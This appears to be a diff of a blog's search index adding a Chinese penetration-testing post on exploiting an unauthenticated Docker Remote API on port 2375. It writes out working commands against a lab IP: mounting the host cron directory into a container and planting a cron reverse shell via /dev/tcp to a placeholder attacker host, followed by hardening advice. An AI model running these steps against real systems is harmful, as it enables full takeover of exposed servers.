@@ -4,13 +4,25 @@
   
   
   <entry>
-    <title>Hello World</title>
-    <link href="/2020/05/23/Hello-World-0/"/>
-    <url>/2020/05/23/Hello-World-0/</url>
+    <title>Docker Remote API 未授权访问漏洞利用</title>
+    <link href="/2020/05/23/Docker-Remote-API-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    <url>/2020/05/23/Docker-Remote-API-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
     
-    <content type="html"><![CDATA[]]></content>
+    <content type="html"><![CDATA[<h4 id="漏洞简介及危害"><a href="#漏洞简介及危害" class="headerlink" title="漏洞简介及危害"></a>漏洞简介及危害</h4><p>Docker是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的LINUX机器上，也可以实现虚拟化。 Docker swarm 是一个将docker集群变成单一虚拟的docker host工具，使用标准的Docker API，能够方便docker集群的管理和扩展，由docker官方提供。</p><p>Docker Remote API 是一个取代远程命令行界面（rcli）的REST API。Docker Remote API如配置不当可导致未授权访问，攻击者利用 docker client 或者 http 直接请求就可以访问这个 API，可能导致敏感信息泄露，黑客也可以删除Docker上的数据。 攻击者可进一步利用Docker自身特性，直接访问宿主机上的敏感信息，或对敏感文件进行修改，最终完全控制服务器。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h5><pre><code class="hljs plain"># 靶机IP&#x2F;端口172.19.101.34 2375# 操作系统linux_x86</code></pre><h5 id="未授权访问测试"><a href="#未授权访问测试" class="headerlink" title="未授权访问测试"></a>未授权访问测试</h5><pre><code class="hljs plain">docker tcp:&#x2F;&#x2F;172.19.101.34:2375 --version# 返回版本信息，漏洞存在Docker version 19.03.5, build 633a0ea</code></pre><h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><pre><code class="hljs plain"># 在攻击主机上打开8088端口监听[root@]# nc -vv -l -p 8088</code></pre><h5 id="写入shell"><a href="#写入shell" class="headerlink" title="写入shell"></a>写入shell</h5><p>创建容器，利用bash和crontab计划任务向宿主机写入shell，centos系统挂载路径为。 /var/spool/cron/root；ubuntu系统为/var/spool/cron/crontabs/root；</p><pre><code class="hljs plain"># 查看宿主机可用镜像docker tcp:&#x2F;&#x2F;172.19.101.34:2375 image# 选择合适镜像创建容器docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 run -it -v &#x2F;var&#x2F;spool&#x2F;cron&#x2F;:&#x2F;var&#x2F;spool&#x2F;cron&#x2F; image_id &#x2F;bin&#x2F;bash# 启动刚刚创建的容器并连接docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 start ct_iddocker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 exec -it --user root ct_id &#x2F;bin&#x2F;bash# 执行shell反弹命令root@bfd2539dfdc8:&#x2F;# echo &#39;* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;attack_ip&#x2F;8088 0&gt;&amp;1&#39; &gt;&gt; &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</code></pre><h5 id="成功反弹宿主机shell"><a href="#成功反弹宿主机shell" class="headerlink" title="成功反弹宿主机shell"></a>成功反弹宿主机shell</h5><p><img src="/img/docker_res.png" srcset="/img/loading.gif" alt="image"></p><blockquote><p>P.S ，测试完记得删掉存在漏洞的容器</p></blockquote><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><p>临时解决方案：</p><p>1、对2375端口做网络访问控制，如设置iptables策略仅允许指定的IP来访问Docker接口；</p><p>2、修改docker swarm的认证方式，使用TLS认证：Overview Swarm with TLS 和 Configure Docker Swarm for TLS这两篇文档，说的是配置好TLS后，Docker CLI 在发送命令到docker daemon之前，会首先发送它的证书，如果证书是由daemon信任的CA所签名的，才可以继续执行。</p><p><strong>总之、不要将端口直接暴露在公网，内网中使用需要设置严格的访问规则，并使用TLS。</strong></p>]]></content>
     
     
+    <categories>
+      
+      <category>渗透测试</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>安全</tag>
+      
+    </tags>
     
   </entry>
   
